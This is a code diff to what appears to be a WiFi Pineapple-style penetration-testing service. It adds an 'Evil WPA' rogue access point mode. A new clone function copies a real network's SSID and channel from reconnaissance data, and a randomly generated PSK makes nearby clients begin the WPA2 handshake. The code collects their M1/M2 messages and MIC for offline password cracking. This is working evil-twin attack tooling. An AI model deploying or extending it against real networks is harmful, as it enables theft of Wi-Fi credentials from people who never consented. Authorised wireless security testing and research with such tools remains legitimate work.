@@ -165,6 +165,24 @@ class PineAPService:
             # think about it. Stable across reboots, different across
             # deployments — see hostapd.bssid_for_ssid().
             "bssid_salt":        secrets.token_hex(16),
+            # ---- Security mode (S12) ----
+            # "open" (Open SSID tab) or "wpa2" (Evil WPA tab). The
+            # engine is the same hostapd instance either way; this
+            # just controls whether wpa=2 lines get rendered in the
+            # config and whether we generate a random PSK at start.
+            "security_mode":     "open",
+            # Last generated rogue PSK (for operator visibility — the
+            # value doesn't matter functionally since clients fail at
+            # M3 with our random PSK, but operators want to know what
+            # the engine set). Regenerated on every wpa2 Start.
+            "last_rogue_psk":    None,
+            # Evil WPA clone target metadata — populated by
+            # clone_evil_wpa_target() when operator clicks "Clone to
+            # PineAP" on a Recon AP slide-out. Lets the UI show
+            # "cloning HomeNet (real BSSID a4:c1:38:...) → rogue BSSID
+            # 82:5f:..." so the operator can tell them apart on the
+            # Handshakes page.
+            "evil_wpa_target":   None,
             "last_changed":      time.time(),
             "running":           False,    # True only while hostapd is up
             # JobManager IDs for the running daemons — used by stop()
@@ -175,6 +193,8 @@ class PineAPService:
             # lifecycle; we just track for the UI status pill)
             "karma_running":     False,
             "sentinel_running":  False,
+            # Evil WPA EAPOL sniffer running flag (S12)
+            "evil_wpa_running":  False,
         }
 
     def _save_state(self) -> None:
@@ -239,11 +259,20 @@ class PineAPService:
         channel: int | None = None,
         primary_hidden: bool | None = None,
         hw_mode: str | None = None,
+        security_mode: str | None = None,
     ) -> tuple[bool, str]:
-        """Update the open-AP config (primary SSID + channel + hidden +
-        band). Refuses while PineAP is running — operator must stop
-        first, change config, restart. (Changing channel under a live
-        hostapd would disconnect every client anyway.)"""
+        """Update the rogue AP config (primary SSID + channel + hidden +
+        band + security mode). Refuses while PineAP is running —
+        operator must stop first, change config, restart. (Changing
+        channel under a live hostapd would disconnect every client
+        anyway.)
+
+        ``security_mode`` is "open" (Open SSID tab path) or "wpa2"
+        (Evil WPA tab path). When set to "wpa2" the engine will
+        generate a fresh random PSK on every Start (logged in the
+        notification drawer) — clients fail at M3 with our random
+        PSK, but by then we've collected the M1+M2 partial.
+        """
         with self._lock:
             self._load()
             if self._state["running"]:
@@ -267,9 +296,75 @@ class PineAPService:
                 if hw_mode not in ("g", "a"):
                     return False, f"hw_mode must be 'g' or 'a', got {hw_mode!r}"
                 self._state["hw_mode"] = hw_mode
+            if security_mode is not None:
+                if security_mode not in ("open", "wpa2"):
+                    return False, f"security_mode must be 'open' or 'wpa2', got {security_mode!r}"
+                # Changing away from wpa2 also clears the cloned-target
+                # metadata so the UI doesn't show stale "cloning from..."
+                # banners after the operator manually switches to open.
+                if security_mode == "open" and self._state.get("security_mode") == "wpa2":
+                    self._state["evil_wpa_target"] = None
+                self._state["security_mode"] = security_mode
             self._state["last_changed"] = time.time()
             self._save_state()
         return True, "AP config updated"
+
+    def clone_evil_wpa_target(
+        self,
+        bssid: str,
+        essid: str,
+        channel: int,
+        *,
+        source_signal_dbm: int | None = None,
+        source_security: str | None = None,
+    ) -> tuple[bool, str]:
+        """Set up Evil WPA cloning from a Recon-observed AP. One-click
+        from the Recon AP slide-out. Configures primary_ssid + channel
+        + security_mode=wpa2 in one shot, plus records the source AP's
+        metadata so the operator can correlate captured handshakes
+        back to the real target on the Handshakes page.
+
+        Refuses while PineAP is running."""
+        bssid = (bssid or "").strip().lower()
+        essid = (essid or "").strip()
+        if not bssid or not essid:
+            return False, "bssid and essid are required"
+        try:
+            ch = int(channel)
+        except (TypeError, ValueError):
+            return False, "channel must be an int"
+        if not (1 <= ch <= 196):
+            return False, f"channel {ch} out of valid range"
+        if len(essid.encode("utf-8")) > MAX_SSID_BYTES:
+            return False, f"essid exceeds {MAX_SSID_BYTES} bytes"
+        # Channel selection determines hw_mode: 2.4GHz = 'g', 5GHz = 'a'.
+        # mt76 cards on this hardware support both bands; the 'g' for
+        # 5GHz check is fine because hostapd will refuse channels that
+        # don't match the mode.
+        hw_mode = "a" if ch >= 36 else "g"
+
+        with self._lock:
+            self._load()
+            if self._state["running"]:
+                return False, "stop PineAP before cloning a new target"
+            self._state["primary_ssid"]   = essid
+            self._state["channel"]        = ch
+            self._state["hw_mode"]        = hw_mode
+            self._state["security_mode"]  = "wpa2"
+            self._state["primary_hidden"] = False
+            self._state["evil_wpa_target"] = {
+                "source_bssid":       bssid,
+                "source_essid":       essid,
+                "source_channel":     ch,
+                "source_signal_dbm":  source_signal_dbm,
+                "source_security":    source_security,
+                "cloned_at":          time.time(),
+            }
+            self._state["last_changed"] = time.time()
+            self._save_state()
+        log.info("pineap: cloned Evil WPA target %r (BSSID %s, ch%d, sig=%s)",
+                 essid, bssid, ch, source_signal_dbm)
+        return True, f"cloned {essid!r} (real BSSID {bssid}, ch{ch}) — ready to Start"
 
     # ---------- Public: SSID pool ----------
     def list_pool(self) -> list[dict[str, Any]]:
@@ -619,10 +714,28 @@ class PineAPService:
                 "hidden": False,
             })
 
+        # Security mode determines whether we render an open AP or a
+        # WPA2-PSK AP. For wpa2, generate a fresh random PSK every
+        # Start — the value doesn't matter functionally (clients fail
+        # at M3 with our random PSK, but by then we've collected M2's
+        # MIC which is the partial we want), and randomizing it
+        # guarantees we never accidentally accept a real client
+        # connection. Persisted to state so the operator can see what
+        # was generated; surfaced in the notification drawer too.
+        security_mode = snap.get("security_mode", "open")
+        rogue_psk: str | None = None
+        if security_mode == "wpa2":
+            # 16 url-safe bytes → ~22 ASCII chars (alphanumeric + - _).
+            # All valid WPA passphrase chars (spec: 8-63 ASCII).
+            rogue_psk = secrets.token_urlsafe(16)
+            with self._lock:
+                self._state["last_rogue_psk"] = rogue_psk
+                self._save_state()
+
         hostapd_body = hostapd_tool.render_config(
             iface=iface,
             ssid=primary_ssid,
-            password=None,                 # open AP — S12 adds WPA variants
+            password=rogue_psk,             # None → open AP; str → wpa=2
             channel=channel,
             hw_mode=hw_mode,
             primary_bssid=primary_bssid,
@@ -637,9 +750,12 @@ class PineAPService:
             )
             with self._lock:
                 self._state["hostapd_job_id"] = hap_job.id
+            sec_label = "WPA2-PSK" if security_mode == "wpa2" else "open"
+            psk_label = f" (rogue PSK: {rogue_psk})" if rogue_psk else ""
             msgs.append(
-                f"hostapd started: SSID {primary_ssid!r} + {len(extras)} "
-                f"extras on ch{channel} (job {hap_job.id})"
+                f"hostapd started [{sec_label}]: SSID {primary_ssid!r} + "
+                f"{len(extras)} extras on ch{channel} (job {hap_job.id})"
+                f"{psk_label}"
             )
         except Exception as e:
             log.exception("pineap: hostapd launch failed")
